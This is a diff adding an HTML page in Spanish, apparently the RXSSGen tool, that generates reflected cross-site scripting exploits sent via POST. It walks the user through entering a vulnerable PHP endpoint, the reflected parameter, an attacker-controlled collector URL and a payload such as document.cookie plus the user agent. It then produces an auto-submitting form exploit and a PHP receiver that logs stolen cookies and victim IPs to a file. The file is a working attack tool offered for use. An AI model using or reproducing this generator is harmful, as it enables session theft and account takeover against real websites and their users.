@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<html>
+<!-- Creado Por StringManolo
+https://github.com/StringManolo/RXSSGen -->
+<head>
+<title>Generador Exploits para explotación de Reflected XSS</title>
+<script>
+"use strict";
+var archivoPHP = "";
+var paramPHP = "";
+var dejarAlerts = true;
+
+function ComprobarAlerts()
+{
+   if(!dejarAlerts)
+   {
+   window.alert = function () {}
+   window.prompt = function() {}
+   window.confirm = function() {}
+   }
+}
+
+function CrearHTML()
+{
+dejarAlerts=confirm("Este generador utiliza alertas para guiarle en el proceso.\n\nPulse aceptar para continuar con la ayuda. (Recomendado si es su primera vez).\n\nSi no necesita asistencia pulse cancelar.");
+ComprobarAlerts();
+
+alert("Generador de Exploits para Cross Site Scripting Reflejado via POST.");
+
+try{
+document.getElementsByTagName('div')[1].outerHTML = prompt("Introduzca la dirección WEB junto al nombre del PHP vulnerable.\n\nEj:\nhttps://WebVulnerable.com/LoginVulnerable.php\n\nSi está explotando un formulario, revise a que documento.php se está realizando la petición.\n\nPor ejemplo action=\"login.php\" equivaldría a:\nhttps://webvulnerable.com/login.php\n\nSi el action existe y está vacio, hace referencia a la propia página. Fíjese en la ruta."); 
+} catch(err){alert(err)}
+
+try{
+document.getElementsByTagName('div')[1].outerHTML = prompt("Introduzca el nombre del parámetro reflejado. Ej: email\n\nDe existir, este es el parámetro que es enviado dentro del cuerpo de la petición HTTP. Puede capturar una petición realizada desde el sitio vulnerable con un Proxy o en su defecto revisar el código fuente. Si está explotando un formulario es posible que el nombre del parámetro se encuentre entre dobles comillas dentro del atributo name de la siguiente forma: name=\"password\" \n\nIntroduzca el parámetro sin comillas.");
+} catch(err){alert(err)}
+
+try{
+archivoPHP=prompt("Introduzca su dirección WEB y el nombre del archivo PHP que recibirá la petición POST desde el objectivo.\n\nEj:\nhttps://WebMaliciosa.com/ReciboPeticionConCookies.php");  document.getElementsByTagName('div')[1].outerHTML=archivoPHP;
+} catch(err){alert(err)}
+
+try{
+paramPHP=prompt("Introduzca el nombre del parámetro que se enviará por POST. Este parámetro es el nombre del índice que debe leer en su archivo PHP, $cookieUserAgent = $_POST[\"NombreParámetro\"]\n\nEj:\nCookie");
+document.getElementsByTagName('div')[1].outerHTML=paramPHP;
+} catch(err){alert(err)}
+
+try{
+document.getElementsByTagName('div')[1].outerHTML = prompt("Introduzca el script a ser ejecutado en el navegador objetivo de la explotación cuando el mismo se encuentre en la web vulnerable. El resultado/return de la expresión será asignado al atributo VALUE para posteriormente ser enviado automáticamente a donde fuere indicado. Si no lo tiene claro, introduzca cualquier valor reconocible y edite a mano el código generado desde esta propia página. Si por ejemplo desea obtener las cookies y el user agent, proceda a introducir:\n\ndocument.cookie+navigator.userAgent");
+} catch(err){alert(err)}
+
+alert("El documento HTML se completó. Puede editarlo o copiarlo directamente al portapapeles.\n\nRecuerde presionar el botón si desea añadir el parámetro al documento PHP");
+}
+
+
+function CrearPHP()
+{
+alert("Recordatorio: Cuando guarde el archivo, recuerde subirlo en la misma ruta y nombre que seleccionó previamente.\n\nRecordatorio: " + archivoPHP);
+
+for(var q = 0; q < 4; ++q) document.getElementsByTagName('code')[0].outerHTML = paramPHP;
+}
+</script>
+</head>
+<body onload="CrearHTML()">
+
+<p>HTML:
+<div contenteditable="true" style="width:90%;height:400px;overflow-y:scroll;padding:10px;background-color:#ffc0c0;align:center">
+<xmp><form name="ataque" method="POST" id="xD" action="</xmp><div></div><xmp>">
+<input type="hidden" name="</xmp><div></div><xmp>" id="fuckit" value="daigual"></form>       
+
+<script>
+var form="<form name=\"ataque2\" method=\"POST\" id=\"formu2\" action=\"</xmp><div></div><xmp>\"><input type=\"hidden\" name=\"</xmp><div></div><xmp>\" id=\"fuckfuck\" value=\"lul\"></form>\<\script> try{document.getElementById(\"fuckfuck\").value = </xmp><div></div><xmp>;}catch(ERROR){}setTimeout(ataque2.submit(),1);<\/\script>";
+
+try
+{
+document.getElementById("fuckit")
+.value = form;
+}
+
+catch(error)
+{
+alert(error);
+}
+
+
+setTimeout(ataque.submit(),1);      
+</script>
+</xmp>
+</div></p><br />
+
+<p><button type="button" onclick="CrearPHP()">Crear PHP</button></p>
+<p>
+PHP:
+<div contenteditable="true" style="width:90%;height:300px;overflow-y:scroll;padding:10px;background-color:#c0c0ff;align:center">
+<xmp>
+<html>
+<body>
+<?php
+
+    $yourdomain = $_SERVER['HTTP_HOST'];
+    $yourdomain = preg_replace('/^www\./' , '' , $yourdomain);
+
+    if(!empty($_POST["</xmp><code></code><xmp>"]))
+    {
+    $</xmp><code></code><xmp> = $_POST["</xmp><code></code><xmp>"];
+    echo "Hola! Bienvenido a mi página web. Que tenga usted una estancia agradable buen señor.";
+    }
+
+
+    $FechaServidor=gmdate("Y-m-d h:i:s",time());
+    $IP=$_SERVER['REMOTE_ADDR'];
+    $endl=PHP_EOL;
+    file_put_contents("xD.txt",$endl, FILE_APPEND); 
+    file_put_contents("xD.txt",$endl, FILE_APPEND);
+    file_put_contents("xD.txt",$FechaServidor, FILE_APPEND);
+    file_put_contents("xD.txt",$endl, FILE_APPEND);
+    file_put_contents("xD.txt",$IP, FILE_APPEND);
+    file_put_contents("xD.txt",$endl, FILE_APPEND); 
+    file_put_contents("xD.txt", $</xmp><code></code><xmp>, FILE_APPEND);
+
+?>
+</body>
+</html>
+</xmp>
+</p>
+</body>
+</html>
